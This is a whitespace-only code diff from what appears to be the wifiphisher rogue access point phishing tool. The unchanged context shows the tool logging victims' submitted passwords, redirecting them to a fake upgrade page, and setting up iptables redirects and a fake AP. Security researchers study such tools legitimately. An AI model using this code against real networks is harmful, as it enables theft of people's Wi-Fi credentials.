@@ -149,7 +149,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
         if self.path == "/":
             with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
-                log_file.write('[' + T + '*' + W + '] ' + O + "GET " + T +
+                log_file.write('['+T+'*'+W+'] ' + O + "GET " + T +
                                self.client_address[0] + W + "\n"
                                )
                 log_file.close()
@@ -186,7 +186,7 @@ class HTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
                     self.send_header('Location', '/upgrading.html')
                     self.end_headers()
                     with open("/tmp/wifiphisher-webserver.tmp", "a+") as log_file:
-                        log_file.write('[' + T + '*' + W + '] ' + O + "POST " +
+                        log_file.write('['+T+'*'+W+'] ' + O + "POST " +
                                        T + self.client_address[0] +
                                        R + " password=" + item.value +
                                        W + "\n"
@@ -675,7 +675,7 @@ if __name__ == "__main__":
 
     # Are you root?
     if os.geteuid():
-        sys.exit('[' + R + '-' + W + '] Please run as root')
+        sys.exit('['+R +'-'+W+'] Please run as root')
     # Get hostapd if needed
     get_hostapd()
     # Parse args
@@ -684,7 +684,7 @@ if __name__ == "__main__":
     # Start HTTP server in a background thread
     Handler = HTTPRequestHandler
     httpd = HTTPServer(("", PORT), Handler)
-    print '[' + T + '*' + W + '] Starting HTTP server at port ' + str(PORT)
+    print '['+T+'*'+W+'] Starting HTTP server at port ' + str(PORT)
     webserver = Thread(target=httpd.serve_forever)
     webserver.daemon = True
     webserver.start()
@@ -692,7 +692,7 @@ if __name__ == "__main__":
     # Start HTTPS server in a background thread
     Handler = SecureHTTPRequestHandler
     httpd = SecureHTTPServer(("", SSL_PORT), Handler)
-    print '[' + T + '*' + W + '] Starting HTTPS server at port ' + str(SSL_PORT)
+    print '['+T+'*'+W+'] Starting HTTPS server at port ' + str(SSL_PORT)
     secure_webserver = Thread(target=httpd.serve_forever)
     secure_webserver.daemon = True
     secure_webserver.start()
@@ -727,7 +727,7 @@ if __name__ == "__main__":
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:%s' % SSL_PORT)
     Popen(['sysctl', '-w', 'net.ipv4.conf.all.route_localnet=1'], stdout=DN, stderr=PIPE)
 
-    print '[' + T + '*' + W + '] Cleared leases, started DHCP, set up iptables'
+    print '['+T+'*'+W+'] Cleared leases, started DHCP, set up iptables'
 
     # Copy AP
     time.sleep(3)
@@ -743,7 +743,7 @@ if __name__ == "__main__":
     dhcp(dhcpconf, ap_iface)
     start_ap(ap_iface, channel, essid, args)
     os.system('clear')
-    print '[' + T + '*' + W + '] ' + T + \
+    print '['+T+'*'+W+'] ' + T + \
           essid + W + ' set up on channel ' + \
           T + channel + W + ' via ' + T + mon_iface \
           + W + ' on ' + T + ap_iface + W
